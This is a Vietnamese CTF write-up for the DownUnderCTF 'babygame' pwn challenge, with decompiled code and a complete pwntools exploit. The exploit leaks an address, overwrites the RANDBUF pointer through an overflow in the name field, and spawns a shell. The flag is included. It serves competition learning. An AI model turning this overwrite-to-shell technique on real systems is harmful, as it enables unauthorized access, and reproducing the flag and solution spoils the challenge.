# BABYGAME

## REVERSE FILE

Các thông số file: 64-bit, dynamic linked, not stripped...
```sh
babygame: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=eb63ec1c73b262295cbcef5af1abdbbab2424b80, for GNU/Linux 4.4.0, not stripped
```
Checksec:
```sh
[*] '/mnt/c/Users/n18dc/OneDrive/Desktop/DownUnderCTF/babygam3/babygame'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Dùng IDA để xem pseudo code của chương trình.
Hàm main trong chương trình.
```sh
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int num; // [rsp+Ch] [rbp-4h]

  init();
  puts("Welcome, what is your name?");
  read(0, NAME, 0x20uLL);
  RANDBUF = "/dev/urandom";
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      num = get_num();
      if ( num != 1337 )
        break;
      game();
    }
    if ( num > 1337 )
    {
LABEL_10:
      puts("Invalid choice.");
    }
    else if ( num == 1 )
    {
      set_username();
    }
    else
    {
      if ( num != 2 )
        goto LABEL_10;
      print_username();
    }
  }
}
```
Hàm game như sau:
```sh
unsigned __int64 game()
{
  FILE *stream; // [rsp+8h] [rbp-18h]
  int ptr; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  stream = fopen(RANDBUF, "rb");
  fread(&ptr, 1uLL, 4uLL, stream);
  printf("guess: ");
  if ( get_num() == ptr )
    system("/bin/sh");
  return v3 - __readfsqword(0x28u);
}
```

Chỉ cần get_num == ptr thì sẽ có shell, vấn đề chính là:
giá trị ptr đọc từ "/dev/urandom" nên sẽ ko đoán được. mình sẽ đè RANDBUF = "/bin/sh" và đọc giá trị cố định để get flag.
## EXPLOIT FILE

Code exploit chương trình như sau:
```sh
from pwn import *
import time
s = process("./babygame")
# s = remote("pwn-2021.duc.tf", 31907)
raw_input("debug")
s.sendline("Z"*0x20)

s.sendline("2")
s.recvuntil("Z"*0x20)

bss_addr = u64(s.recv(6)+"\x00\x00")
print "bss_addr >> " + hex(bss_addr)
binsh = bss_addr + 127

s.sendline("1")
s.sendline("A"*0x20 + p64(binsh))

s.recvuntil("Invalid choice.")

s.sendline("1337")
s.sendline("1179403647")

s.interactive()

#flag DUCTF{whats_in_a_name?_5aacfc58}
```